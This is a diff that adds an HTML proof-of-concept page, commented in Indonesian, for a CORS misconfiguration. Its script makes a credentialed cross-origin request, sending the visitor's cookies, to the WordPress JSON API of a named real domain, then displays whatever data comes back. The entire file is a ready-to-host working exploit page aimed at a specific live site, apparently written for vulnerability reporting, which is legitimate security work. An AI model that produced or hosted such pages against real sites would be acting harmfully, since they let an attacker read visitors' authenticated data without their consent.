@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS Vulnerability PoC</title>
+</head>
+<body>
+    <h1>CORS Misconfiguration PoC</h1>
+    <div id="result">Loading...</div>
+
+    <script>
+        // Fungsi untuk menampilkan hasil dengan format
+        function displayResult(data) {
+            const resultDiv = document.getElementById('result');
+            
+            // Mengkonversi objek ke string JSON dengan format yang rapi
+            const formattedData = JSON.stringify(data, null, 2);
+            resultDiv.innerHTML = '<h3>Data Berhasil Diakses:</h3><pre>' + formattedData + '</pre>';
+        }
+
+        // Fungsi untuk menampilkan error
+        function displayError(error) {
+            const resultDiv = document.getElementById('result');
+            resultDiv.innerHTML = '<h3>Error:</h3><p style="color: red;">' + error + '</p>';
+        }
+
+        // Lakukan permintaan CORS ke endpoint WP-JSON
+        fetch('https://insights.deribit.com/wp-json', {
+            method: 'GET',
+            credentials: 'include', // Penting: Mengirim kredensial (cookie) jika ada
+            headers: {
+                'X-Test': 'CORS-PoC'
+            }
+        })
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('Network response was not ok: ' + response.status);
+            }
+            return response.json();
+        })
+        .then(data => {
+            console.log('Data received:', data);
+            displayResult(data);
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            displayError(error.toString());
+        });
+    </script>
+</body>
+</html>
